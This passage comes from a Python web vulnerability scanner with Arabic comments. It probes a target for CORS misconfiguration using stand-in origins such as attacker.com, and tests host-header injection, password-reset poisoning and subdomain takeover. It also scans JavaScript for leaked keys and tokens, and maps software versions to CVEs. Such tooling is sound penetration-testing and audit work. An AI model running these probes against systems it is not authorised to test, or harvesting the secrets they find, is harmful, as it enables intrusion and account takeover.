                    code2, body2, _, _ = http_probe(test_url, timeout=8)
                    _waf_sleep()

                    if code2 == 200 and len(body2) > 100:
                        test_hash = hashlib.md5(body2.encode()).hexdigest()
                        if test_hash != orig_hash:
                            found(f"IDOR POSSIBLE: {url}")
                            print(GRY+"│    "+RESET+CYN+
                                  f"param: {param}  orig={orig_id} test={test_id}"+RESET)
                            print(GRY+"│    "+RESET+YLW+
                                  f"Different content returned (manual verification needed)"+RESET)
                            findings.append({"type": "IDOR", "url": url, "param": param,
                                             "original_id": orig_id, "tested_id": test_id,
                                             "note": "Different content — verify manually"})
                            break  # وحدة تكفي

    print(GRY+"│"+RESET)
    save_json(f"{out}/active_param_findings.json", findings)
    confirmed_count = len(findings)
    if confirmed_count:
        vuln(f"Active testing confirmed: {confirmed_count} vulnerabilities!")
    else:
        ok("Active parameter testing: no confirmed vulns")
    print(GRY+"└"+"─"*70+RESET)
    return findings


# ══════════════════════════════════════════════════════════════════════════════
#  5c. CORS + HOST HEADER INJECTION  +  SUBDOMAIN TAKEOVER
# ══════════════════════════════════════════════════════════════════════════════

# CNAME fingerprints لـ subdomain takeover
TAKEOVER_FINGERPRINTS = [
    (re.compile(r"github\.io"),          "GitHub Pages",       "There isn't a GitHub Pages site here"),
    (re.compile(r"herokuapp\.com"),       "Heroku",             "No such app"),
    (re.compile(r"s3\.amazonaws\.com"),   "AWS S3",             "NoSuchBucket"),
    (re.compile(r"netlify\.app"),         "Netlify",            "Not Found"),
    (re.compile(r"azurewebsites\.net"),   "Azure",              "404 Web Site not found"),
    (re.compile(r"shopify\.com"),         "Shopify",            "Sorry, this shop is currently unavailable"),
    (re.compile(r"fastly\.net"),          "Fastly",             "Fastly error: unknown domain"),
    (re.compile(r"ghost\.io"),            "Ghost",              "The thing you were looking for is no longer here"),
    (re.compile(r"helpscoutdocs\.com"),   "HelpScout",          "No settings were found"),
    (re.compile(r"freshdesk\.com"),       "Freshdesk",          "There is no helpdesk here"),
    (re.compile(r"zendesk\.com"),         "Zendesk",            "Help Center Closed"),
    (re.compile(r"webflow\.io"),          "Webflow",            "The page you are looking for doesn't exist"),
    (re.compile(r"surge\.sh"),            "Surge.sh",           "project not found"),
    (re.compile(r"bitbucket\.io"),        "Bitbucket",          "Repository not found"),
    (re.compile(r"unbouncepages\.com"),   "Unbounce",           "The requested URL was not found"),
    (re.compile(r"statuspage\.io"),       "Statuspage",         "You are being redirected"),
    (re.compile(r"cargocollective\.com"), "Cargo Collective",   "404 Not Found"),
    (re.compile(r"tumblr\.com"),          "Tumblr",             "Whatever you were looking for doesn't live here"),
    (re.compile(r"squarespace\.com"),     "Squarespace",        "No Such Account"),
    (re.compile(r"wordpress\.com"),       "WordPress",          "Do you want to register"),
]

def cors_and_misc_checks(domain, classified, subs, out):
    """CORS misconfiguration + Host Header Injection + Subdomain Takeover"""
    print()
    print(GRY+"┌─ "+RESET+WHT+BOLD+"STEP 5c"+RESET+GRY+" ─── "+RESET+
          CYN+BOLD+"CORS  ·  HOST HEADER  ·  SUBDOMAIN TAKEOVER"+RESET)
    print(GRY+"│"+RESET)

    findings = []
    base_url = f"https://{domain}"

    # ── 1. CORS Misconfiguration (subdomain confusion + advanced origins) ───────
    info("CORS misconfiguration check (7 origin variants) ...")

    # سبع variants تكتشف أكثر أنواع CORS misconfig
    cors_origins = [
        (f"https://attacker.com",                "basic-attacker"),
        ("null",                                  "null-origin"),
        (f"https://{domain}.attacker.com",        "subdomain-suffix"),    # regex: .*domain.*
        (f"https://attacker.com.{domain}",        "domain-prefix"),       # regex: domain.*
        (f"https://not{domain}",                  "prefix-bypass"),
        (f"https://{domain}%60.attacker.com",     "backtick-escape"),
        (f"http://{domain}",                      "proto-downgrade"),     # https → http
    ]

    cors_targets = list(dict.fromkeys(
        [i["url"] for i in classified.get("API Endpoints",[])  if i.get("status")==200][:6] +
        [i["url"] for i in classified.get("Login / Auth",  []) if i.get("status")==200][:3] +
        [base_url + "/"]
    ))

    cors_seen = set()
    for url in cors_targets:
        for origin, otag in cors_origins:
            code, body, hdrs, _ = http_probe(url, timeout=7,
                                              extra_headers={"Origin": origin})
            acao = hdrs.get("Access-Control-Allow-Origin","")
            acac = hdrs.get("Access-Control-Allow-Credentials","").lower()

            if not acao or acao == "*":
                if acao == "*":
                    info(f"CORS wildcard (*) — {url[:55]} [{otag}]")
                continue

            # تحقق هل الـ origin انعكس أو قُبل
            reflected = (origin.lower() in acao.lower() or
                         acao.lower() == "null" or
                         "attacker" in acao.lower())
            if not reflected:
                continue

            key = f"{url}|{acao}"
            if key in cors_seen: continue
            cors_seen.add(key)

            # حدة: credentials=true = CRITICAL
            if acac == "true":
                severity = "CRITICAL"
                col = RED+BOLD
                vuln(f"CORS CRITICAL [{otag}]: {url[:60]}")
                vuln(f"Origin reflected + credentials=true → account takeover possible")
            elif "attacker" in acao.lower() or acao.lower() == "null":
                severity = "HIGH"
                col = ORG+BOLD
                found(f"CORS HIGH [{otag}]: {url[:60]}")
            else:
                severity = "MEDIUM"
                col = YLW

            print(GRY+"│    "+RESET+GRY+
                  f"Origin sent: {origin[:50]}"+RESET)
            print(GRY+"│    "+RESET+GRY+
                  f"ACAO: {acao}  ACAC: {acac}"+RESET)
            findings.append({"type":f"CORS-{severity}","url":url,
                              "ACAO":acao,"ACAC":acac,
                              "origin_used":origin,"technique":otag})

    # ── 2. Host Header Injection ──────────────────────────────────────────────
    print(GRY+"│"+RESET)
    info("Host header injection check ...")
    evil_host = "attacker-evil.com"

    for test_hdr, tag in [
        ({"Host":        evil_host},                      "Host"),
        ({"X-Forwarded-Host": evil_host},                 "X-Forwarded-Host"),
        ({"X-Host":      evil_host},                      "X-Host"),
        ({"Host":        f"{domain}@{evil_host}"},        "Host@evil"),
    ]:
        code, body, hdrs, _ = http_probe(base_url+"/", timeout=7,
                                          extra_headers=test_hdr)
        body_lower = body.lower()
        # لو الـ evil host انعكس في الـ body أو الـ Location header
        if evil_host in body_lower or evil_host in hdrs.get("Location","").lower():
            vuln(f"Host Header Injection via {tag}")
            print(GRY+"│    "+RESET+RED+f"Reflected '{evil_host}' in response"+RESET)
            findings.append({"type":"HostHeaderInjection","header":tag,
                              "url":base_url,"evidence":evil_host})
        # password reset poisoning check
        reset_paths = ["/forgot","/reset-password","/password-reset","/recover"]
        for rp in reset_paths:
            code2, body2, hdrs2, _ = http_probe(base_url+rp, timeout=6,
                                                  extra_headers=test_hdr)
            if code2 in (200,302) and evil_host in body2.lower():
                vuln(f"Password Reset Poisoning via {tag} on {rp}")
                findings.append({"type":"PasswordResetPoisoning","path":rp,"header":tag})
                break

    # ── 3. Subdomain Takeover ────────────────────────────────────────────────
    print(GRY+"│"+RESET)
    info(f"Subdomain takeover check ({len(subs)} subdomains) ...")
    print(GRY+"│"+RESET)

    def _dns_cname(hostname):
        """CNAME lookup بدون dig — يستخدم socket وnslookup fallback."""
        # محاولة 1: dnspython لو موجود
        try:
            import dns.resolver as _dr
            ans = _dr.resolve(hostname, "CNAME", lifetime=5)
            return str(ans[0].target).rstrip(".").lower()
        except ImportError:
            pass
        except Exception:
            pass
        # محاولة 2: nslookup (أخف من dig)
        try:
            r = subprocess.run(
                ["nslookup","-type=CNAME", hostname],
                capture_output=True, text=True, timeout=5
            )
            for line in r.stdout.lower().splitlines():
                if "canonical name" in line or "cname" in line:
                    parts = line.split("=")
                    if len(parts) > 1:
                        return parts[-1].strip().rstrip(".")
        except Exception:
            pass
        # محاولة 3: socket getaddrinfo (يُعطي A record فقط — fallback)
        try:
            results = socket.getaddrinfo(hostname, None, socket.AF_INET)
            if results:
                return ""   # لا CNAME — الـ host يرد A record مباشرة
        except socket.gaierror:
            return "NXDOMAIN"
        except Exception:
            pass
        return ""

    def check_takeover(sub):
        hits = []
        try:
            cname = _dns_cname(sub)
            if not cname: return hits
            if cname == "NXDOMAIN":
                # لو الـ sub لا يُحل DNS أصلاً — غير مفيد للتقاط
                return hits
            for pat, service, fingerprint in TAKEOVER_FINGERPRINTS:
                if pat.search(cname):
                    code, body, _, _ = http_probe(f"https://{sub}", timeout=6)
                    if code in (200, 404) and fingerprint.lower() in body.lower():
                        hits.append({"subdomain":sub,"cname":cname,
                                     "service":service,"fingerprint":fingerprint})
                    elif code == 0:
                        hits.append({"subdomain":sub,"cname":cname,
                                     "service":service,
                                     "fingerprint":"No HTTP response — dangling CNAME"})
        except Exception as e:
            logger.debug(f"Takeover check failed for {sub}: {e}")
        return hits

    takeover_hits = []
    with ThreadPoolExecutor(max_workers=pool_workers(20)) as ex:
        fmap = {ex.submit(check_takeover, s): s for s in subs[:100]}
        for f in as_completed(fmap):
            try:
                for h in f.result(timeout=10):
                    vuln(f"SUBDOMAIN TAKEOVER: {h['subdomain']} → {h['service']}")
                    print(GRY+"│    "+RESET+RED+f"CNAME: {h['cname']}"+RESET)
                    print(GRY+"│    "+RESET+RED+f"Fingerprint: {h['fingerprint'][:70]}"+RESET)
                    takeover_hits.append(h)
                    findings.append({"type":"SubdomainTakeover", **h})
            except Exception as e:
                logger.debug(f"Takeover future failed: {e}")

    if not takeover_hits:
        ok("Subdomain takeover: no dangling CNAMEs found")

    print(GRY+"│"+RESET)
    save_json(f"{out}/misc_findings.json", findings)
    critical = len([f for f in findings if f.get("type") in
                    ("CORS-CRITICAL","SubdomainTakeover","HostHeaderInjection",
                     "PasswordResetPoisoning")])
    ok(f"Misc findings: {BOLD}{len(findings)}{RESET}  ({BOLD}{critical}{RESET} critical)")
    print(GRY+"└"+"─"*70+RESET)
    return findings

# ══════════════════════════════════════════════════════════════════════════════
#  6. COOKIE / SESSION ANALYSIS
#     يكتشف: MD5 cookies, weak tokens, session fixation, insecure flags
# ══════════════════════════════════════════════════════════════════════════════

# قيم شائعة مشفرة بـ MD5 — لكشف predictable session tokens
COMMON_MD5={
    "cfcd208495d565ef66e7dff9f98764da":"0",
    "c4ca4238a0b923820dcc509a6f75849b":"1",
    "c81e728d9d4c2f636f067f89cc14862c":"2",
    "eccbc87e4b5ce2fe28308fd9f2a7baf3":"3",
    "d41d8cd98f00b204e9800998ecf8427e":"(empty string)",
    "21232f297a57a5a743894a0e4a801fc3":"admin",
    "7fa3b767c460b54a2be4d49030b349c7":"password",
    "e10adc3949ba59abbe56e057f20f883e":"123456",
    "827ccb0eea8a706c4c34a16891f84e7b":"12345",
    "5f4dcc3b5aa765d61d8327deb882cf99":"password",
    "25f9e794323b453885f5181f1b624d0b":"123456789",
    "0d107d09f5bbe40cade3de5c71e9e9b7":"letmein",
    "098f6bcd4621d373cade4e832627b4f6":"test",
    "1a1dc91c907325c69271ddf0c944bc72":"pass",
}

def analyze_cookies(domain, out):
    section(6,"COOKIE / SESSION ANALYSIS")

    base_url=f"https://{domain}"
    findings=[]

    # جمع cookies من عدة pages
    pages=["/","/login","/admin","/api/","/dashboard"]
    all_cookies={}

    for page in pages:
        code,body,hdrs,ms=http_probe(base_url+page,timeout=8)
        if code==0: continue
        raw_cookies=hdrs.get("Set-Cookie","")
        if not raw_cookies: continue
        # parse multiple Set-Cookie — تجنب كسر Expires dates اللي فيها comma
        cookie_line=raw_cookies
        parts = re.split(r',\s*(?=[A-Za-z_][A-Za-z0-9_\-]*=)', cookie_line)
        for part in parts:
            m=re.match(r"\s*([^=]+)=([^;]*)(.*)",part.strip(),re.DOTALL)
            if m:
                name=m.group(1).strip(); val=m.group(2).strip()
                flags=m.group(3).lower()
                if name.lower() not in ('expires','path','domain','max-age'):
                    all_cookies[name]={"value":val,"flags":flags,"page":page,"code":code}

    if not all_cookies:
        info("No cookies found"); _end(); return findings

    info(f"Cookies found: {len(all_cookies)}")
    print(GRY+"│"+RESET)

    for name,cdata in all_cookies.items():
        val=cdata["value"]; flags=cdata["flags"]
        issues=[]

        # ── 1. MD5 check ──────────────────────────────────────────────────────
        if re.match(r"^[0-9a-f]{32}$",val,re.I):
            if val.lower() in COMMON_MD5:
                issues.append(f"PREDICTABLE MD5 = md5({COMMON_MD5[val.lower()]})")
            else:
                issues.append("MD5-format token — may be predictable")

        # ── 2. Weak token entropy check ───────────────────────────────────────
        if len(val)>8:
            unique_chars=len(set(val.lower()))
            if unique_chars<8 and len(val)>16:
                issues.append(f"LOW ENTROPY (only {unique_chars} unique chars)")

        # ── 3. Security flags ─────────────────────────────────────────────────
        if "httponly" not in flags:
            issues.append("Missing HttpOnly flag (XSS risk)")
        if "secure" not in flags and base_url.startswith("https"):
            issues.append("Missing Secure flag")
        if "samesite" not in flags:
            issues.append("Missing SameSite flag (CSRF risk)")

        # ── 4. Base64 check ───────────────────────────────────────────────────
        if re.match(r"^[A-Za-z0-9+/]{20,}={0,2}$",val):
            try:
                decoded=base64.b64decode(val).decode("utf-8",errors="ignore")
                if re.search(r"[a-z]{3,}",decoded,re.I):
                    issues.append(f"Base64 decodable: {decoded[:60]}")
            except Exception:
                pass

        # ── 5. JWT check ──────────────────────────────────────────────────────
        if re.match(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*",val):
            issues.append("JWT token — check alg:none and weak secret")
            try:
                parts=val.split(".")
                hdr=base64.b64decode(parts[0]+"==").decode("utf-8",errors="ignore")
                payload=base64.b64decode(parts[1]+"==").decode("utf-8",errors="ignore")
                issues.append(f"JWT header: {hdr[:80]}")
                issues.append(f"JWT payload: {payload[:100]}")
            except Exception:
                pass

        # طباعة
        has_critical=any("PREDICTABLE" in i or "Base64" in i or "JWT" in i for i in issues)
        badge=(RED+BOLD+"[VULN]"+RESET if has_critical else
               YLW+"[WARN]"+RESET if issues else GRY+"[OK]  "+RESET)
        print(GRY+"│  "+RESET+badge+"  "+WHT+f"{name}"+RESET+GRY+f" = {val[:40]}"+RESET)
        for issue in issues:
            col=RED+BOLD if any(x in issue for x in ("PREDICTABLE","Base64","JWT header")) else YLW
            print(GRY+"│         "+RESET+col+f"→ {issue}"+RESET)
            findings.append({"cookie":name,"value":val,"issue":issue})
        if not issues:
            print(GRY+"│         "+RESET+GRY+DIM+"→ No issues found"+RESET)

    # ── Session Fixation test ─────────────────────────────────────────────────
    print(GRY+"│"+RESET)
    info("Testing session fixation ...")
    test_sid="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0"
    c2,b2,h2,_=http_probe(f"{base_url}/?PHPSESSID={test_sid}",timeout=6)
    sc2=h2.get("Set-Cookie","")
    if test_sid in sc2:
        found("Session fixation possible via GET parameter")
        findings.append({"cookie":"PHPSESSID","issue":"Session Fixation via GET"})
    else:
        ok("Session fixation: not vulnerable (server regenerates ID)")

    print(GRY+"│"+RESET)
    save_json(f"{out}/cookie_analysis.json",findings)
    vuln_count=len([f for f in findings if any(x in f.get("issue","") for x in
                    ("PREDICTABLE","Base64","JWT","Fixation","HttpOnly","Secure"))])
    ok(f"Cookie issues found: {BOLD}{len(findings)}{RESET}  "
       f"({BOLD}{vuln_count}{RESET} critical/high)")
    _end()
    return findings

# ══════════════════════════════════════════════════════════════════════════════
#  7. VERSION + CVE MAPPING
#     يسحب إصدارات التقنيات ويربطها بـ CVEs معروفة
# ══════════════════════════════════════════════════════════════════════════════

# CVEs مهمة مرتبطة بإصدارات — قائمة مبنية على الخبرة
KNOWN_CVE_MAP={
    # PHP versions
    "php 5.4":  [("CVE-2016-5773","RCE via ZipArchive unserialize",9.8),
                 ("CVE-2016-5771","RCE via SPL unserialize",9.8),
                 ("CVE-2015-6834","RCE use-after-free unserialize",9.8),
                 ("CVE-2016-5385","HTTPoxy SSRF",8.1),
                 ("CVE-2015-4116","RCE SplMinHeap",9.8)],
    "php 5.5":  [("CVE-2016-5773","RCE via ZipArchive",9.8),
                 ("CVE-2015-6834","RCE unserialize",9.8)],
    "php 5.6":  [("CVE-2016-5773","RCE via ZipArchive",9.8)],
    # Apache
    "apache 2.2":[("CVE-2017-7679","Buffer overflow mod_mime",9.8),
                  ("CVE-2017-7668","ap_find_token OOB",9.8),
                  ("CVE-2014-0226","Race condition mod_status",6.8)],
    "apache 2.4":[("CVE-2021-41773","Path traversal + RCE",9.8),
                  ("CVE-2021-42013","Path traversal",9.8),
                  ("CVE-2017-7679","Buffer overflow",9.8)],
    # jQuery
    "jquery 1.": [("CVE-2019-11358","Prototype pollution",6.1),
                  ("CVE-2015-9251","XSS via cross-domain AJAX",6.1)],
    "jquery 2.": [("CVE-2019-11358","Prototype pollution",6.1),
                  ("CVE-2020-11022","XSS via HTML parsing",6.1)],
    "jquery 3.": [("CVE-2020-11022","XSS via HTML parsing",6.1),
                  ("CVE-2020-11023","XSS via HTML manipulation",6.1)],
    # Bootstrap
    "bootstrap 3.":[("CVE-2018-14040","XSS in collapse data-parent",6.1),
                    ("CVE-2018-14042","XSS in data-template",6.1),
                    ("CVE-2019-8331","XSS in tooltip/popover",6.1)],
    # Slider Revolution
    "slider revolution":[("CVE-2014-9734","Arbitrary file upload",10.0),
                         ("CVE-2014-9734","Local file inclusion",10.0)],
    # prettyPhoto
    "prettyphoto":  [("CVE-2013-3520","Reflected XSS",4.3)],
    # PDF.js
    "pdf.js 1.":    [("CVE-2015-2743","Privilege escalation",7.5)],
    # jQuery UI
    "jquery ui 1.11":[("CVE-2016-7103","XSS in closeText",6.1)],
    "jquery ui 1.12":[("CVE-2021-41182","XSS in datepicker",6.1),
                      ("CVE-2021-41183","XSS in .position()",6.1)],
    # Moment.js
    "moment.js 2.":[("CVE-2022-24785","Path traversal",7.5),
                    ("CVE-2017-18214","ReDoS",7.5)],
}

def version_cve_map(domain, tech_map, out):
    section(7,"VERSION DETECTION  +  CVE MAPPING")

    base_url=f"https://{domain}"
    all_findings=[]

    # ── 1. سحب headers للإصدارات ─────────────────────────────────────────────
    info("Extracting version info from headers + body ...")
    code,body,hdrs,ms=http_probe(base_url+"/",timeout=10)

    version_hints={}

    # من headers
    for h in ("Server","X-Powered-By","X-AspNet-Version","X-Runtime","Via"):
        if h in hdrs: version_hints[h]=hdrs[h]

    # من tech_map
    for host,techs in tech_map.items():
        for t in techs:
            version_hints[f"httpx:{t}"]=t

    # من body — أنماط إصدارات
    version_patterns=[
        (r"PHP/([0-9.]+)","PHP"),
        (r"Apache/([0-9.]+)","Apache"),
        (r"nginx/([0-9.]+)","nginx"),
        (r"jQuery v?([0-9.]+)","jQuery"),
        (r"Bootstrap v?([0-9.]+)","Bootstrap"),
        (r"jQuery UI - v([0-9.]+)","jQuery UI"),
        (r"Moment\.js.*?([0-9]+\.[0-9]+\.[0-9]+)","Moment.js"),
        (r"prettyPhoto","prettyPhoto"),
        (r"Revolution Slider","Slider Revolution"),
        (r"PDFJS","PDF.js"),
    ]

    # فحص JS files للإصدارات
    js_urls_to_check=[
        "/assets/js/jquery.min.js","/js/jquery.js",
        "/wp-includes/js/jquery/jquery.min.js",
        "/assets/plugins/revolution/js/jquery.themepunch.revolution.min.js",
    ]

    combined_body=body
    for js_path in js_urls_to_check[:5]:
        c2,b2,h2,_=http_probe(base_url+js_path,timeout=5)
        if c2==200 and "text/html" not in h2.get("Content-Type",""):
            combined_body+=b2[:5000]

    detected_versions={}
    for pat,name in version_patterns:
        m=re.search(pat,combined_body,re.I)
        if m:
            ver=m.group(1) if m.lastindex else "detected"
            detected_versions[name]=ver

    # من headers
    server_hdr=hdrs.get("Server","")
    if server_hdr:
        m=re.search(r"(Apache|nginx|IIS)[/\s]([0-9.]+)",server_hdr,re.I)
        if m: detected_versions[m.group(1)]=m.group(2)

    php_hdr=hdrs.get("X-Powered-By","")
    if php_hdr:
        m=re.search(r"PHP/([0-9.]+)",php_hdr,re.I)
        if m: detected_versions["PHP"]=m.group(1)

    # من tech_map
    for host,techs in tech_map.items():
        for t in techs:
            m=re.match(r"(PHP|Apache|nginx|jQuery|Bootstrap|WordPress)[/\s]?([0-9.]+)?",t,re.I)
            if m and m.group(2): detected_versions[m.group(1)]=m.group(2)

    if not detected_versions:
        info("No versions detected from headers/body")
    else:
        info(f"Detected versions ({len(detected_versions)}):")
        for name,ver in detected_versions.items():
            print(GRY+"│    "+RESET+CYN+f"{name:<20}"+RESET+WHT+ver+RESET)

    print(GRY+"│"+RESET)

    # ── 2. CVE Mapping ────────────────────────────────────────────────────────
    info("Mapping to known CVEs ...")
    print(GRY+"│"+RESET)

    cve_findings=[]
    checked=set()

    # من detected_versions
    for tech_name,ver in detected_versions.items():
        lookup_key=f"{tech_name.lower()} {ver[:3]}"
        if lookup_key in checked: continue
        checked.add(lookup_key)
        for pattern,cves in KNOWN_CVE_MAP.items():
            if pattern in lookup_key or lookup_key.startswith(pattern):
                for cve_id,desc,score in cves:
                    col=RED+BOLD if score>=9 else (ORG+BOLD if score>=7 else YLW)
                    print(GRY+"│  "+RESET+col+f"[{cve_id}]"+RESET+
                          WHT+f"  {tech_name} {ver}"+RESET)
                    print(GRY+"│       "+RESET+GRY+f"CVSS:{score}  {desc}"+RESET)
                    cve_findings.append({"tech":tech_name,"version":ver,
                                         "cve":cve_id,"desc":desc,"cvss":score})

    # من tech_map مباشرة (بدون version)
    for host,techs in tech_map.items():
        for t in techs:
            t_lower=t.lower()
            for pattern,cves in KNOWN_CVE_MAP.items():
                if pattern in t_lower or t_lower.startswith(pattern.split()[0]):
                    for cve_id,desc,score in cves:
                        if not any(f["cve"]==cve_id for f in cve_findings):
                            col=RED+BOLD if score>=9 else (ORG+BOLD if score>=7 else YLW)
                            print(GRY+"│  "+RESET+col+f"[{cve_id}]"+RESET+
                                  WHT+f"  {t}"+RESET)
                            print(GRY+"│       "+RESET+GRY+f"CVSS:{score}  {desc}"+RESET)
                            cve_findings.append({"tech":t,"version":"?",
                                                 "cve":cve_id,"desc":desc,"cvss":score})

    if not cve_findings:
        ok("No CVEs mapped — versions may not be detectable")

    print(GRY+"│"+RESET)
    save_json(f"{out}/cve_mapping.json",{"versions":detected_versions,"cves":cve_findings})
    critical_cves=len([c for c in cve_findings if c["cvss"]>=9])
    ok(f"CVEs mapped  : {BOLD}{len(cve_findings)}{RESET}  "
       f"({BOLD}{critical_cves}{RESET} CVSS≥9)")
    _end()
    return cve_findings

# ══════════════════════════════════════════════════════════════════════════════
#  8. JS SECRETS SCANNER
# ══════════════════════════════════════════════════════════════════════════════

JS_PATS={
    "AWS Access Key":   re.compile(r"(?<![A-Z0-9])AKIA[0-9A-Z]{16}(?![A-Z0-9])"),
    "Google API Key":   re.compile(r"AIza[0-9A-Za-z\-_]{35}"),
    "Firebase URL":     re.compile(r"https://[a-z0-9-]+\.firebaseio\.com"),
    "JWT":              re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"),
    "Private Key":      re.compile(r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY"),
    "Slack Token":      re.compile(r"xox[baprs]-[0-9]{10,12}-[0-9]{10,12}-[A-Za-z0-9]{24,}"),
    "GitHub Token":     re.compile(r"gh[pousr]_[A-Za-z0-9]{36,}"),
    "Stripe Key":       re.compile(r"(?:sk|pk)_(?:live|test)_[A-Za-z0-9]{20,}"),
    "Basic Auth URL":   re.compile(r"https?://[^:@\s]{3,}:[^:@\s]{3,}@[a-z0-9\-\.]+"),
    "Hardcoded Passwd": re.compile(r"""(?i)(?:password|passwd|pwd)\s*[=:]\s*['"]([^'"]{8,64})['"]"""),
    "API Key Assign":   re.compile(r"""(?i)(?:api[_-]?key|apikey|x-api-key)\s*[=:]\s*['"]([A-Za-z0-9\-_]{20,})['"]"""),
    "Internal URL":     re.compile(r"https?://(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)[^\s'\"]{5,}"),
}
PLACEHOLDERS={"undefined","null","placeholder","example","changeme",
               "password","secret","your_key","xxx","test","sample"}

def scan_js(domain, live_lines, urls, out):
    section(8,"JS SECRETS SCANNER")

    # ── 1. JS URLs من خطوة 4 ─────────────────────────────────────────────────
    js_urls = {u for u in urls if ".js" in u.split("?")[0][-4:]}
    info(f"JS from step-4 crawl: {len(js_urls)}")

    # ── 2. مشط HTML من كل live hosts لاستخراج <script src=> ───────────────
    live_host_urls = set()
    for _line in live_lines:
        _m = re.match(r"(https?://[^\s\[/]+)", _line)
        if _m: live_host_urls.add(_m.group(1))
    live_host_urls.add(f"https://{domain}")

    def _extract_js(base_url):
        _found = set()
        _, _body, _, _ = http_probe(base_url+"/", timeout=8)
        if not _body: return _found
        for _src in re.findall(r"""src=["']([^"']{3,200})["']""", _body):
            _src = _src.strip()
            if ".js" not in _src: continue
            if _src.startswith("http"):  _found.add(_src)
            elif _src.startswith("//"): _found.add("https:"+_src)
            elif _src.startswith("/"):  _found.add(base_url.rstrip("/")+_src)
            else:                        _found.add(base_url.rstrip("/")+"/"+_src)
        return _found

    with ThreadPoolExecutor(max_workers=pool_workers(15)) as _js_ex:
        for _r in _js_ex.map(_extract_js, sorted(live_host_urls), timeout=90):
            js_urls.update(_r)

    info(f"Total JS files queued: {len(js_urls)}")
    secrets=[]

    def scan_one(js_url):
        code,body,hdrs,_=http_probe(js_url,timeout=10)
        ct=hdrs.get("Content-Type","").lower()
        if code==0 or not body or len(body)<100 or "text/html" in ct: return []
        hits=[]; seen=set()
        for name,pat in JS_PATS.items():
            for m in pat.finditer(body):
                val=m.group(0)[:120]
                inner=(m.group(1) if m.lastindex else val).lower().strip()
                if inner in PLACEHOLDERS or len(inner)<10: continue
                if val in seen: continue
                seen.add(val)
                hits.append({"type":name,"value":val,"url":js_url})
        return hits

    with ThreadPoolExecutor(max_workers=pool_workers(10)) as ex:
        fmap={ex.submit(scan_one,u):u for u in list(js_urls)[:60]}
        for f in as_completed(fmap):
            try:
                for h in f.result(timeout=15):
                    found(h["type"])
                    print(GRY+"│     val: "+RESET+RED+BOLD+h["value"][:90]+RESET)
                    print(GRY+"│     src: "+RESET+GRY+DIM+h["url"][:80]+RESET)
                    secrets.append(h)
            except Exception as e:
                logger.debug(f"JS scan future failed: {e}")

    if not secrets: ok("No secrets found")
    save_json(f"{out}/js_secrets.json",secrets)
    ok(f"JS secrets: {BOLD}{len(secrets)}{RESET}")
    _end()
    return secrets

# ══════════════════════════════════════════════════════════════════════════════
#  9. SECURITY HEADERS AUDIT
# ══════════════════════════════════════════════════════════════════════════════

SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "desc": "HSTS — Forces HTTPS connections",
        "severity": "HIGH",
        "recommendation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
    },
    "Content-Security-Policy": {
        "desc": "CSP — Prevents XSS, data injection attacks",
        "severity": "HIGH",
        "recommendation": "Add a strict CSP policy. At minimum: default-src 'self'",
    },
    "X-Frame-Options": {
        "desc": "Clickjacking protection",
        "severity": "MEDIUM",
        "recommendation": "Add: X-Frame-Options: DENY (or SAMEORIGIN)",
    },
    "X-Content-Type-Options": {
        "desc": "Prevents MIME-type sniffing",
        "severity": "MEDIUM",
        "recommendation": "Add: X-Content-Type-Options: nosniff",
    },
    "Permissions-Policy": {
        "desc": "Controls browser feature access (camera, mic, etc.)",
        "severity": "LOW",
        "recommendation": "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()",
    },
    "Referrer-Policy": {
        "desc": "Controls referrer information leakage",
        "severity": "LOW",
        "recommendation": "Add: Referrer-Policy: strict-origin-when-cross-origin",
    },
    "X-Permitted-Cross-Domain-Policies": {
        "desc": "Controls Adobe Flash/Acrobat cross-domain requests",
        "severity": "LOW",
        "recommendation": "Add: X-Permitted-Cross-Domain-Policies: none",
    },
}

# CSP dangerous directives
CSP_DANGEROUS = [
    ("unsafe-inline",  "Allows inline scripts — XSS risk"),
    ("unsafe-eval",    "Allows eval() — XSS risk"),
    ("data:",          "Allows data: URIs — XSS risk"),
    ("*",              "Wildcard source — too permissive"),
    ("http:",          "Allows HTTP — mixed content risk"),
]

def audit_security_headers(domain, live_lines, out):
    section(9, "SECURITY HEADERS AUDIT")

    findings = []

    # اجمع hosts للفحص
    hosts = set()
    for line in live_lines:
        m = re.match(r"(https?://[^\s\[/]+)", line)
        if m: hosts.add(m.group(1))
    hosts.add(f"https://{domain}")

    for host_url in sorted(hosts)[:20]:
        code, body, hdrs, _ = http_probe(host_url + "/", timeout=8)
        if code == 0: continue

        hdrs_lower = {k.lower(): v for k, v in hdrs.items()}
        missing = []
        weak = []

        for header, meta in SECURITY_HEADERS.items():
            h_lower = header.lower()
            if h_lower not in hdrs_lower:
                missing.append((header, meta))
            else:
                val = hdrs_lower[h_lower]
                # فحص CSP ضعيف
                if h_lower == "content-security-policy":
                    for dangerous, reason in CSP_DANGEROUS:
                        if dangerous in val.lower():
                            weak.append((header, f"Contains '{dangerous}': {reason}"))
                # فحص HSTS ضعيف
                if h_lower == "strict-transport-security":
                    m_age = re.search(r"max-age=(\d+)", val)
                    if m_age and int(m_age.group(1)) < 31536000:
                        weak.append((header, f"max-age={m_age.group(1)} (< 1 year)"))
                    if "includesubdomains" not in val.lower():
                        weak.append((header, "Missing includeSubDomains"))
                # فحص X-Frame-Options ضعيف
                if h_lower == "x-frame-options" and val.upper() not in ("DENY", "SAMEORIGIN"):
                    weak.append((header, f"Unusual value: {val}"))

        if missing or weak:
            host_short = host_url.replace("https://", "").replace("http://", "")
            print(GRY+"│  "+RESET+WHT+BOLD+host_short+RESET)

            for header, meta in missing:
                sev = meta["severity"]
                col = RED+BOLD if sev == "HIGH" else (YLW if sev == "MEDIUM" else GRY)
                print(GRY+"│    "+RESET+col+f"MISSING  {header}"+RESET+
                      GRY+DIM+f"  ({meta['desc']})"+RESET)
                findings.append({"host": host_url, "header": header,
                                 "issue": "missing", "severity": sev,
                                 "recommendation": meta["recommendation"]})

            for header, issue in weak:
                print(GRY+"│    "+RESET+ORG+f"WEAK     {header}"+RESET+
